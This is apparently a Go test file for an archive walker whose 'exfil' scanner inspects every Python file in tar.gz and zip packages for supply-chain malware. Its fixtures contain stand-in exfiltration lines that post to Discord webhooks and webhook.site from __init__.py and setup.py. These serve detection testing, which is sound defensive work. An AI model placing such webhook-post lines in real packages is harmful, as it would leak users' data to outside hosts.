package stream

import (
	"bytes"
	"context"
	"io"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

// matchPy is the source-file matcher the exfil scanner uses in these
// tests: every .py entry, regardless of depth.
func matchPy(e Entry) bool { return strings.HasSuffix(e.Path, ".py") }

// recordingScanner returns a Scanner that appends every scanned path to
// *paths after fully draining the body, capturing the bodies it saw
// into *bodies when that map is non-nil.
func recordingScanner(name string, maxSize int64, paths *[]string, bodies map[string]string) Scanner {
	return Scanner{
		Name:    name,
		MaxSize: maxSize,
		Match:   matchPy,
		Scan: func(path string, body io.Reader) error {
			b, err := io.ReadAll(body)
			if err != nil {
				return err
			}
			*paths = append(*paths, path)
			if bodies != nil {
				bodies[path] = string(b)
			}
			return nil
		},
	}
}

func TestWalkWithScanners_TarScansEveryMatchingEntry(t *testing.T) {
	// The whole reason a Scanner exists rather than a CaptureIntent: it
	// must fire for EVERY matching entry, not just the first. spadata's
	// payload is in __init__.py — a non-singular filename — so a
	// first-match-only model would miss a second weaponized module.
	arc := newTarGz(t).
		addFile("pkg/__init__.py", []byte("import x\npost('https://discord.com/api/webhooks/1/t')\n")).
		addFile("pkg/sub/__init__.py", []byte("clean\nrequests.post('https://webhook.site/zzz')\n")).
		addFile("pkg/readme.txt", []byte("nothing to see\n")).
		reader()

	var scanned []string
	bodies := map[string]string{}
	sc := recordingScanner("exfil", 1<<20, &scanned, bodies)

	m, err := WalkWithScanners(context.Background(), arc,
		FormatTarGzip, nil, []Scanner{sc}, Limits{})
	require.NoError(t, err)

	// Both .py files scanned (NOT first-match-only); the .txt skipped.
	require.ElementsMatch(t, []string{"pkg/__init__.py", "pkg/sub/__init__.py"}, scanned)
	require.Contains(t, bodies["pkg/__init__.py"], "discord.com/api/webhooks")
	require.Contains(t, bodies["pkg/sub/__init__.py"], "webhook.site")

	// Scanned bodies are NOT retained in the manifest — that's the
	// non-retaining contract distinguishing Scanner from CaptureIntent.
	require.Empty(t, m.Captured)
}

func TestWalkWithScanners_TarOversizeSkippedAndRecorded(t *testing.T) {
	// An entry larger than the scanner's MaxSize must NOT be read into
	// memory and must be recorded in SkippedScans — no silent cap. The
	// walk must still advance past the skipped body and finish cleanly.
	arc := newTarGz(t).
		addFile("small.py", []byte("post('https://webhook.site/x')\n")).
		addFile("big.py", bytes.Repeat([]byte("a"), 100)).
		reader()

	var scanned []string
	sc := recordingScanner("exfil", 40, &scanned, nil)

	m, err := WalkWithScanners(context.Background(), arc,
		FormatTarGzip, nil, []Scanner{sc}, Limits{})
	require.NoError(t, err)

	require.Equal(t, []string{"small.py"}, scanned) // big.py not scanned
	require.Contains(t, m.SkippedScans, "big.py")
}

func TestWalkWithScanners_TarCapturedEntryAlsoScanned(t *testing.T) {
	// A file claimed by a CaptureIntent must still be visible to a
	// matching Scanner — otherwise capturing setup.py for one consumer
	// would blind the exfil scan to it.
	arc := newTarGz(t).
		addFile("setup.py", []byte("post('https://webhook.site/x')\n")).
		reader()

	intent := CaptureIntent{
		Name:    "setup",
		MaxSize: 1 << 20,
		Match:   func(e Entry) bool { return e.Path == "setup.py" },
	}
	var scanned []string
	sc := recordingScanner("exfil", 1<<20, &scanned, nil)

	m, err := WalkWithScanners(context.Background(), arc,
		FormatTarGzip, []CaptureIntent{intent}, []Scanner{sc}, Limits{})
	require.NoError(t, err)

	require.Equal(t, []string{"setup.py"}, scanned) // scanner saw it
	require.Contains(t, m.Captured, "setup")        // intent captured it
}

func TestWalkWithScanners_ZipScansEveryMatchingEntry(t *testing.T) {
	// Parity for the zip walker (PyPI wheels, golang modules, GitHub
	// release zips). Same all-matching-entries contract as tar.
	arc := newZip(t).
		addFile("a/__init__.py", []byte("post('https://discord.com/api/webhooks/9/t')\n")).
		addFile("b/__init__.py", []byte("requests.post('https://webhook.site/q')\n")).
		addFile("c/notes.md", []byte("docs\n")).
		reader()

	var scanned []string
	sc := recordingScanner("exfil", 1<<20, &scanned, nil)

	_, err := WalkWithScanners(context.Background(), arc,
		FormatZip, nil, []Scanner{sc}, Limits{})
	require.NoError(t, err)
	require.ElementsMatch(t, []string{"a/__init__.py", "b/__init__.py"}, scanned)
}

func TestWalk_NilScannersBackwardCompatible(t *testing.T) {
	// Walk delegates to WalkWithScanners with no scanners; the manifest
	// is unaffected and SkippedScans stays empty.
	arc := newTarGz(t).addFile("x.py", []byte("clean\n")).reader()
	m, err := Walk(context.Background(), arc, FormatTarGzip, nil, Limits{})
	require.NoError(t, err)
	require.Empty(t, m.SkippedScans)
	require.Len(t, m.Entries, 1)
}
